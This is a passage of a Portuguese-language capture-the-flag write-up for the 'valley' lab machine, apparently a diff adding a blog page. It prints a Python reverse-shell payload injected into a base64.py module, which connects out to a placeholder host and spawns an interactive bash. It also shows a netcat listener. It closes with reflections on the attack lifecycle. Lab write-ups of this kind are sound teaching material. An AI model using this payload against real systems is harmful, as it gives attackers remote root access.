+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">dup2</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">run</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&#34;ip&#34;</span><span class="p">,</span> <span class="mi">3000</span><span class="p">))</span>  
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl"><span class="n">run</span><span class="p">([</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="s2">&#34;-i&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span> <span class="n">restante</span> <span class="n">do</span> <span class="n">código</span> <span class="o">------</span>
+</span></span></code></pre></div><p><img alt="base64.py com payload reverse shell" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/73zanj2nczqmpzhkmj0l.jpeg"></p>
+<h3 id="final-escalation-privileges-e-complete-mission">Final Escalation Privileges e Complete Mission</h3>
+<hr>
+<p>A elevação de privilégios desse contexto se finaliza assim que o o netcat  escuta na porta 3000 e recebe a conexão de entrada feita a partir do arquivo base64.py.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">3000</span>
+</span></span></code></pre></div><p><img alt="root" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jpbowthykp15zbqm069u.jpeg">
+o arquivo final se encontra no root.txt e ao utilizar o whoami, o mesmo confirma estar na raíz da aplicação. Portanto, a missão e objetivo final foi completado pelo invasor. Entretanto, parte da perspectiva da máquina valley, mas aqui poderia ser novamente mais um ciclo de ataques e busca por dados sensíveis, qualquer informação que seja pertinente. Este é o fim, por causa das flags, mas seria o fim de um ataque real? Como agir nesse contexto, em quais etapas seria interessante visualizar soluções e formas de conter esse ataque maior e mais severo? É claro que esse contexto é bem mais simples e não tão complexo quanto em um cenário real.</p>
+<h3 id="considerações-finais">Considerações finais</h3>
+<hr>
+<p>A máquina valley trouxe base para o entendimento do modelo <strong>attack lifecycle</strong>, que caso seja de interesse do leitor, tem um pouco do livro <strong>A arte da guerra</strong> de <strong>Sun Tzu</strong>. A informação é um fator crucial e muito importante, assim como no campo de batalha, não seria diferente em um possível ataque cibernético, no princípio desde o reconhecimento inicial, construindo todas as informações que poderiam ser extraídas naquele contexto sobre o alvo, o comprometimento a partir de uma credencial exposta em uma rota e sendo o ponta pé inicial de invasão e o estabelecimento da conexão, onde será mantido o acesso àquele servidor. A elevação de privilégios, essa etapa voltou em diversos momentos para que culminasse no objetivo final, ou seja, o invasor não pensa em um só  ataque e pronto, não é algo unilateral, parte também da perspectiva de possibilidades que terá a seu favor. Então, as questões ali em conjunto com os privilégios, como o reconhecimento pós uma &ldquo;melhora&rdquo; no acesso, a movimentação lateral de tentar mais um usuário que dê a possibilidade de injetar um payload de reverse shell em um módulo python, a manutenção para firmar essa presença nessa aplicação e mais uma escalada desses privilégios até o encontro da ultima flag na raiz.
+Logo, assim como a água não ser constante, <strong>Heráclito</strong> de <strong>Éfeso</strong> diz que você não toma banho duas vezes no mesmo rio, porque esse mesmo rio já passou, se encontra no passado e você já não é o mesmo de ontem. É importante pensar nessa construção de probabilidades de um atacante, de construir e entender o contexto daquilo, porque partir dessa análise mais aberta contribui para uma forma mais clara e objetiva de estacar ou conter um ciberataque. O modelo é um norte, não sendo tudo ali elaborado exatamente daquele jeito, mas pode ser uma referência para guiar nesse processo.</p>
+<h3 id="referências-bibliográficas">Referências bibliográficas</h3>
+<hr>
+<ul>
+<li><strong>TZU, Sun.</strong> <em>A arte da guerra</em>. Tradução de André da Silva Bueno. 2. ed. São Paulo: Editora UNESP, 2009.</li>
+<li><strong>MESSIER, Ric.</strong> <em>Certified Ethical Hacker (CEH) v11: Study Guide</em>. 2. ed. Sybex, 2021.</li>
+</ul>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/obtuosa" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2025 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:44215/js/main.js" ></script>
+
+    
+
+</body>
+</html>
